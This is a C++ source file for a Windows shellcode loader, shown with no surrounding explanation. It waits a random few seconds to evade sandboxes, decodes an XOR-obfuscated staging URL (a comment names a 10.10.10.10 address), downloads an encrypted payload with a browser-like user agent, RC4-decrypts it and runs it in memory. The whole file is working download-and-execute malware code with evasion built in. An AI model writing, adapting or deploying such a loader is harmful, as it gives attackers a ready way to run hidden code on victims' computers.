#include <iostream>
#include <fstream>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <cstring>
#include <chrono>
#include <thread>
#include <random>
#include <string>

#pragma comment(lib, "wininet.lib")

// Function to decrypt the URL string in memory
std::string DecryptString(const std::vector<unsigned char>& encrypted, unsigned char key) {
    std::string decrypted = "";
    for (auto b : encrypted) {
        decrypted += (char)(b ^ key);
    }
    return decrypted;
}

void RC4Decrypt(std::vector<char>& data, const std::string& key) {
    int keylen = key.size();
    unsigned char s[256];
    for (int i = 0; i < 256; ++i) s[i] = i;

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % keylen]) % 256;
        std::swap(s[i], s[j]);
    }

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.size(); ++n) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        std::swap(s[i], s[j]);
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

std::vector<char> LoadRemoteData(const std::string& url) {
    std::vector<char> buffer;
    const char* userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";

    HINTERNET hInternet = InternetOpenA(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return buffer;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return buffer;
    }

    char temp[4096];
    DWORD bytesRead;
    while (InternetReadFile(hConnect, temp, sizeof(temp), &bytesRead) && bytesRead) {
        buffer.insert(buffer.end(), temp, temp + bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

void ExecutePayload(const std::string& url) {
    std::vector<char> buffer = LoadRemoteData(url);
    if (buffer.empty()) return;

    std::string key = "windows.h";
    RC4Decrypt(buffer, key);

    void* exec = VirtualAlloc(nullptr, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) return;

    std::memcpy(exec, buffer.data(), buffer.size());

    DWORD oldProtect;
    if (!VirtualProtect(exec, buffer.size(), PAGE_EXECUTE_READ, &oldProtect)) return;

    void (*func)() = (void(*)())exec;
    func();
}

int main() {
    // 1. Anti-Sandbox Jitter
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(5000, 8000);
    std::this_thread::sleep_for(std::chrono::milliseconds(distr(gen)));

    // 2. OBFUSCATED URL
    // Generated: python url_obfuscator.py http://10.10.10.10/data.enc 0x55 --c-init
    std::vector<unsigned char> encryptedUrl = {
    0x3d, 0x21, 0x21, 0x25, 0x6f, 0x7a, 0x7a, 0x64,
    0x65, 0x7b, 0x64, 0x65, 0x7b, 0x64, 0x61, 0x7b,
    0x64, 0x60, 0x6d, 0x7a, 0x31, 0x34, 0x21, 0x34,
    0x7b, 0x30, 0x3b, 0x36
};
    unsigned char urlKey = 0x55;

    // Decrypt the URL only at the moment of use
    std::string decryptedUrl = DecryptString(encryptedUrl, urlKey);
// Simple sanity check: ensure the URL looks like a HTTP URL
if (decryptedUrl.empty() || decryptedUrl.find("http") != 0) {
    std::cerr << "Invalid URL after deobfuscation" << std::endl;
    return 1;
}

    ExecutePayload(decryptedUrl);

    return 0;
}
